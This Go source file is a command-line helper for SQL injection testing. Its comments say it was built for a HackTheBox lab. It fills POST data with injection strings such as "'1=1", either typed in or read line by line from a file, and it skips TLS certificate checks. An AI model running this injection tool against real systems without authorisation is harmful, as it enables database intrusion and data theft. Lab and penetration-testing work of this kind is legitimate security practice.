package main

// Use the GOPATH for development and then transition over to the prep script
// go env -w GOPATH="/home/thepcn3rd/go/workspaces/injectionWebRequest"

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o injWebRequest.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o injWebRequest.exe -ldflags "-w -s" main.go

/*

Simple web request rebuilt to conduct SQL injection with POST data
The xxx in the data is replaced with the injection that is set
Then the output that is sent to stdout can be truncated based on the cut above and cut below to focus on the location of where the SQL injection will appear

Created July 2024 working on Hackthebox Ascension

To modify the configuration a congif.json file was created and a flag is available
to change the default config.json if necessary.  Below is a sample config.json that
needs to be created.

{
        "method": "post",
        "url": "http://10.13.38.20/book-trip.php",
        "output": "true",
        "saveOutput": "true",
        "outputFilename": "output.txt",
        "cookie": "",
        "contentType": "",
        "headerKey": "",
        "headerValue": "",
        "userAgent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "postData": "destination=xxx&adults3&children=3",
        "sqlInject": "'1=1",
        "cutAbove": 0,
        "cutBelow": 10000,
		"runWebServer": "true",
		"webServerPort": "11000"
}


Features:
1. Build config.json if it does not exist
2. Reads config.json file to know where to inject, looks for the xxx in the POST data
3. Configuration option to runWebServer is set to true and the port is configured appropriate to the user, allows you to see the output in the browser
4. Allows you to change the injection point and the sqlInject
5. Allows you to control to output to stdout and save the output to a file
6. Allows you to control the stdout and truncate the output to focus on specific lines if needed
7. Allows you to specify the User Agent
8. Allows you to read an input file for injections to perform


Future Features:
1. Expand so that multiple headers can be specified if necessary


*/

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"

	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
)

type requestConfStruct struct {
	ReqMethod      string `json:"method"`
	ReqURL         string `json:"url"`
	ReqOutput      string `json:"output"`
	ReqOutputSave  string `json:"saveOutput"`
	ReqPath        string `json:"outputFilename"`
	ReqCookie      string `json:"cookie"`
	ReqContentType string `json:"contentType"`
	ReqHeaderKey   string `json:"headerKey"`
	ReqHeaderValue string `json:"headerValue"`
	ReqUserAgent   string `json:"userAgent"`
	ReqData        string `json:"postData"`
	ReqInjection   string `json:"sqlInject"`
	ReqPayload     string `json:"payload"`
	CutAbove       int    `json:"cutAbove"`
	CutBelow       int    `json:"cutBelow"`
	RunWebServer   string `json:"runWebServer"`
	WebServerIP    string `json:"webServerIP"`
	WebServerPort  string `json:"webServerPort"`
	InputFile      string `json:"inputFile"`
}

func prepareString(osDetected string, input string) string {
	var output string
	if osDetected == "windows" {
		output = strings.Replace(input, "\r\n", "", -1)
	} else {
		output = strings.Replace(input, "\n", "", -1)
	}
	return output
}

func helpMenu() {
	fmt.Print("\n\n<-- Help -->")
	fmt.Print("\nset method get (Change HTTP Method to GET, POST, DELETE, HEAD, PUT, etc.)")
	fmt.Print("\nset url http://127.0.0.1:8000 (Change URL to inject)")
	fmt.Print("\nset cookie PHPSESSID=blahblahblah")
	fmt.Print("\nset content-type application/json")
	fmt.Print("\nset user-agent webrequest (Default: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0)")
	fmt.Print("\nset header (Key:Value) <-- No space between the key and the value")
	fmt.Print("\nset data {'p': 'test'}  (Currently supports JSON and ASCII)")
	fmt.Print("\nset output (Toggle the Output to the Screen)")
	fmt.Print("\nset save (Toggle if the Output is Saved to the Path")
	fmt.Print("\nset path /tmp/output.txt - (Set the path where to save the file)\n\n")
	fmt.Print("\nset injection AND 1 = 1")
	fmt.Print("\nset inputfile input.txt (List of injections to run)")
	fmt.Print("\nset cutabove 5  (Cuts any character output to stdout above the number)")
	fmt.Print("\nset cutbelow 50 (Cuts any character output to stdout below the number)")
}

func padString(str string, length int) string {
	for len(str) < length {
		str = str + " "
	}
	return str
}

func main() {
	osDetected := runtime.GOOS
	//var config requestConfStruct
	var colorReset = "\033[0m"
	var colorRed = "\033[31m"
	var colorGreen = "\033[32m"

	ConfigPtr := flag.String("conf", "config.json", "Configuration file to read")
	flag.Parse()

	// Check if the default config.json file exists if it does not exist create it
	if !(cf.FileExists("/config.json")) {
		fmt.Println("File does not exist...")
		b64configDefault := "ewoJIm1ldGhvZCI6ICJwb3N0IiwKCSJ1cmwiOiAiaHR0cDovLzEwLjEzLjM4LjIwL2Jvb2stdHJpcC5waHAiLAoJIm91dHB1dCI6ICJ0cnVlIiwKCSJzYXZlT3V0cHV0IjogInRydWUiLAoJIm91dHB1dEZpbGVuYW1lIjogIm91dHB1dC5odG1sIiwKCSJjb29raWUiOiAiIiwKCSJjb250ZW50VHlwZSI6ICIiLAoJImhlYWRlcktleSI6ICIiLAoJImhlYWRlclZhbHVlIjogIiIsCgkidXNlckFnZW50IjogIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6MTA5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTE0LjAiLAoJInBvc3REYXRhIjogImRlc3RpbmF0aW9uPXh4eCZhZHVsdHMzJmNoaWxkcmVuPTMiLAoJInNxbEluamVjdCI6ICInMT0xIiwKCSJwYXlsb2FkIjogImxlYXZlZW1wdHkiLAoJImN1dEFib3ZlIjogMCwKCSJjdXRCZWxvdyI6IDEwMDAwLAoJInJ1bldlYlNlcnZlciI6ICJ0cnVlIiwKCSJ3ZWJTZXJ2ZXJJUCI6ICIxMjcuMC4wLjEiLAoJIndlYlNlcnZlclBvcnQiOiAiMTEwMDAiLAoJImlucHV0RmlsZSI6ICIiCn0K"
		b64decodedBytes, err := base64.StdEncoding.DecodeString(b64configDefault)
		cf.CheckError("Unable to decode the b64 of the config.json file", err, true)
		b64decodedString := string(b64decodedBytes)
		cf.SaveOutputFile(b64decodedString, "config.json")
	}

	// Load the config.json file
	fmt.Println("Loading the following config file: " + *ConfigPtr + "\n")
	configFile, err := os.Open(*ConfigPtr)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	var config requestConfStruct
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}

	// Execute a web server in the background to display the page that is being interacted with... (Feature does not mean it works...)
	if config.RunWebServer == "true" {
		cf.CreateDirectory("/static")
		// Define the web server handler
		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			http.FileServer(http.Dir("./static")).ServeHTTP(w, r)
		})

		// Run the web server in a Goroutine
		go func() {
			portInfo := config.WebServerIP + ":" + config.WebServerPort
			if err := http.ListenAndServe(portInfo, nil); err != nil {
				fmt.Printf("Failed to start server: %v\n", err)
			}
		}()
	}

	//client = &client{Transport: tr}
	//fmt.Print("<-- Simple Browser -->\n")
	columnWidth := 35
	optionSelected := "beginLoop"
	for optionSelected != "e" && optionSelected != "E" && optionSelected != "exit" {
		// HTTP Method (GET, POST, HEAD, PUT, DELETE, ...)
		fmt.Print(padString("Method", columnWidth) + "-  " + padString(config.ReqMethod, columnWidth) + "\n")
		fmt.Print(padString("URL", columnWidth) + "-  " + padString(config.ReqURL, columnWidth) + "\n")
		fmt.Print(padString("Cookie", columnWidth) + "-  " + padString(config.ReqCookie, columnWidth) + "\n")
		fmt.Print(padString("Content-Type", columnWidth) + "-  " + padString(config.ReqContentType, columnWidth) + "\n")
		fmt.Print(padString("User-Agent", columnWidth) + "-  " + padString(config.ReqUserAgent, columnWidth) + "\n")
		fmt.Print(padString("Custom Header", columnWidth) + "-  " + padString(config.ReqHeaderKey+": "+config.ReqHeaderValue, columnWidth) + "\n")
		fmt.Print(padString("Data", columnWidth) + "-  " + padString(config.ReqData, columnWidth) + "\n")
		fmt.Print(padString("Injection to xxx: ", columnWidth) + "-  " + padString(config.ReqInjection, columnWidth) + "\n")
		fmt.Print(padString("Payload: ", columnWidth) + "-  " + padString(config.ReqPayload, columnWidth) + "\n")
		fmt.Print(padString("Output to Screen (Response)", columnWidth) + "-  " + padString(config.ReqOutput, columnWidth) + "\n")
		fmt.Print(padString("Output to Screen (Cut Chars Above)", columnWidth) + "-  " + padString(fmt.Sprintf("%d", config.CutAbove), columnWidth) + "\n")
		fmt.Print(padString("Output to Screen (Cut Chars Below)", columnWidth) + "-  " + padString(fmt.Sprintf("%d", config.CutBelow), columnWidth) + "\n")
		fmt.Print(padString("Save to Path (Response)", columnWidth) + "-  " + padString(config.ReqOutputSave, columnWidth) + "\n")
		fmt.Print(padString("Path (Output Path)", columnWidth) + "-  " + padString(config.ReqPath, columnWidth) + "\n")
		fmt.Print(padString("Input File for Injections: ", columnWidth) + "-  " + padString(config.InputFile, columnWidth) + "\n\n")
		if config.RunWebServer == "true" {
			if cf.FileExists("/static/" + config.ReqPath) {
				outputURL := fmt.Sprintf("http://%s:%s/output.html", config.WebServerIP, config.WebServerPort)
				fmt.Printf("\nURL of Local Web Server Output: %s\n", outputURL)
			}
		}

		fmt.Print("\nshow help\n")
		//fmt.Print("load config\n")
		//fmt.Print("save config\n")
		if config.InputFile == "" {
			fmt.Print("run\n")
		} else {
			fmt.Printf("run %s(File: %s)%s\n", colorGreen, config.InputFile, colorReset)
		}
		fmt.Print("exit\n\n")
		fmt.Print("$ ")
		inputReader := bufio.NewReader(os.Stdin)
		optionSelected, _ = inputReader.ReadString('\n')
		optionSelected = prepareString(osDetected, optionSelected)
		optionSelectedLower := strings.ToLower(optionSelected)
		if strings.Contains(optionSelectedLower, "show help") {
			helpMenu()
		} else if strings.Contains(optionSelectedLower, "set method") {
			setMethod := strings.TrimPrefix(optionSelectedLower, "set method ")
			if setMethod == "get" || setMethod == "post" || setMethod == "put" {
				config.ReqMethod = setMethod
				continue
			} else {
				fmt.Printf(colorRed + "\nIncorrect method, choose from the following: (get, post)\n\n" + colorReset)
			}
		} else if strings.Contains(optionSelectedLower, "set url") {
			setURL := strings.TrimPrefix(optionSelectedLower, "set url ")
			config.ReqURL = setURL
		} else if strings.Contains(optionSelectedLower, "set user-agent") {
			setUA := strings.TrimPrefix(optionSelectedLower, "set user-agent ")
			config.ReqUserAgent = setUA
		} else if strings.Contains(optionSelectedLower, "set data") {
			setData := strings.TrimPrefix(optionSelectedLower, "set data ")
			config.ReqData = setData
		} else if strings.Contains(optionSelected, "set cookie") {
			setCookie := strings.TrimPrefix(optionSelected, "set cookie ")
			config.ReqCookie = setCookie
		} else if strings.Contains(optionSelected, "set output") {
			if config.ReqOutput == "true" {
				config.ReqOutput = "false"
			} else {
				config.ReqOutput = "true"
			}
		} else if strings.Contains(optionSelected, "set save") {
			if config.ReqOutputSave == "true" {
				config.ReqOutputSave = "false"
			} else {
				config.ReqOutputSave = "true"
			}
		} else if strings.Contains(optionSelected, "set content-type") {
			setContentType := strings.TrimPrefix(optionSelected, "set content-type ")
			config.ReqContentType = setContentType
		} else if strings.Contains(optionSelected, "set header") {
			setCustomHeader := strings.TrimPrefix(optionSelected, "set header ")
			setCustomHeaderItems := strings.Split(setCustomHeader, ":")
			//fmt.Print(setCustomHeaderItems[1])
			//fmt.Print("\n")
			config.ReqHeaderKey = setCustomHeaderItems[0]
			config.ReqHeaderValue = setCustomHeaderItems[1]
		} else if strings.Contains(optionSelected, "set injection") {
			setInjection := strings.TrimPrefix(optionSelected, "set injection ")
			config.ReqInjection = setInjection
		} else if strings.Contains(optionSelected, "set cutabove") {
			strCutAbove := strings.TrimPrefix(optionSelected, "set cutabove ")
			intCutAbove, err := strconv.Atoi(strCutAbove)
			cf.CheckError("Unable to convert the cutabove int from a string", err, true)
			config.CutAbove = intCutAbove
		} else if strings.Contains(optionSelected, "set cutbelow") {
			strCutBelow := strings.TrimPrefix(optionSelected, "set cutbelow ")
			intCutBelow, err := strconv.Atoi(strCutBelow)
			cf.CheckError("Unable to convert the cutabove int from a string", err, true)
			config.CutBelow = intCutBelow
		} else if strings.Contains(optionSelected, "set inputfile") {
			setInputFile := strings.TrimPrefix(optionSelected, "set inputfile ")
			config.InputFile = setInputFile
		} else if optionSelectedLower == "run" {
			if config.InputFile == "" {
				runOptionSelected(config, 0)
			} else {
				fileInput, err := os.Open(config.InputFile)
				cf.CheckError("Unable to open input file for injection", err, true)
				defer fileInput.Close()
				scanner := bufio.NewScanner(fileInput)
				lineCount := 1
				for scanner.Scan() {
					// Repeated line from file goes here
					config.ReqInjection = scanner.Text()
					runOptionSelected(config, lineCount)
					//fmt.Println(scanner.Text())
					lineCount += 1
				}

			}

		} // End of run
	}
}

// The line count is passed in the event the function is called in a loop passing multiple lines for injection
func runOptionSelected(config requestConfStruct, lineCount int) {
	var req *http.Request
	var err error
	var jsonData []byte
	var colorReset = "\033[0m"
	var colorGreen = "\033[32m"

	// The below setup ignores the security of the certificate that is presented... (Self-signed and revoked)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	if config.ReqData == "" {
		req, err = http.NewRequest(strings.ToUpper(config.ReqMethod), config.ReqURL, nil)
		cf.CheckError("Unable to build new request", err, true)
	} else {
		if strings.Contains(config.ReqData, "{") {
			// Need to extend this in the event it is not JSON data...
			jsonData = []byte(config.ReqData)
			req, err = http.NewRequest(strings.ToUpper(config.ReqMethod), config.ReqURL, bytes.NewBuffer(jsonData))
			cf.CheckError("Unable to create the POST request for a JSON payload", err, true)
			// Set the content-type header to be JSON
			config.ReqContentType = "application/json"
		} else {
			config.ReqPayload = strings.Replace(config.ReqData, "xxx", url.QueryEscape(config.ReqInjection), -1)
			//fmt.Println(config.ReqPayload)
			asciiData := []byte(config.ReqPayload)
			req, err = http.NewRequest(strings.ToUpper(config.ReqMethod), config.ReqURL, bytes.NewBuffer(asciiData))
			cf.CheckError("Unable to create the POST request with an ASCII Payload", err, true)
			// Set the content-type header to be ASCII
			config.ReqContentType = "application/x-www-form-urlencoded"
			//req.Header.Set("Content-Type", "text/plain; charset=us-ascii")
		}
	}
	if config.ReqCookie != "" {
		items := strings.Split(config.ReqCookie, "=")

		req.AddCookie(&http.Cookie{
			Name: items[0], Value: items[1], MaxAge: 60,
		})
	}
	if config.ReqContentType != "" {
		req.Header.Add("Content-Type", config.ReqContentType)
	}
	if config.ReqHeaderKey != "" {
		//fmt.Print(config.reqHeaderKey)
		if config.ReqHeaderKey == "Host" {
			req.Host = config.ReqHeaderValue
		} else {
			req.Header.Add(config.ReqHeaderKey, config.ReqHeaderValue)
		}
	}
	if config.ReqUserAgent != "" {
		req.Header.Set("User-Agent", config.ReqUserAgent)
	}
	resp, err := client.Do(req)
	cf.CheckError("Unable to request URL specified", err, true)
	respBody, _ := io.ReadAll(resp.Body)
	//fmt.Println(resp.Header)
	// Output to console only if we are not cycling through a file
	if config.ReqOutput == "true" && lineCount == 0 {
		//fmt.Printf(string(respBody))
		//
		//
		charCount := 0
		for _, c := range string(respBody) {
			charCount += 1
			// Introducing the cut above and cut below capabilities to shorten the output to the screen...
			if charCount >= config.CutAbove && charCount <= config.CutBelow {
				if fmt.Sprintf("%c", c) == "\n" {
					fmt.Printf("%c", c)
					fmt.Printf("%d: ", charCount)
				} else {
					fmt.Printf("%c", c)
				}
			}
		}
	}
	if config.ReqOutputSave == "true" {
		// Output to File - Overwrites if file exists...
		var fileName string
		var outputPath string
		//fmt.Println(lineCount)
		if lineCount > 0 {
			fileName = fmt.Sprintf("%d", lineCount) + "_" + config.ReqPath
			//fmt.Println(outputPath)
		} else {
			fileName = config.ReqPath
		}
		if config.RunWebServer == "true" {
			outputPath = "static/" + fileName
		} else {
			outputPath = fileName
		}
		f, err := os.Create(outputPath)
		cf.CheckError("Unable to create file to save output "+outputPath, err, true)
		defer f.Close()
		fmt.Printf(colorGreen+"\nSaved the file to %s\n\n"+colorReset, outputPath)
		outputURL := fmt.Sprintf("http://%s:%s/%s", config.WebServerIP, config.WebServerPort, fileName)
		fmt.Printf("\nURL of Local Web Server Output: %s\n", outputURL)
		f.Write(respBody)
		f.Close()
	}
}
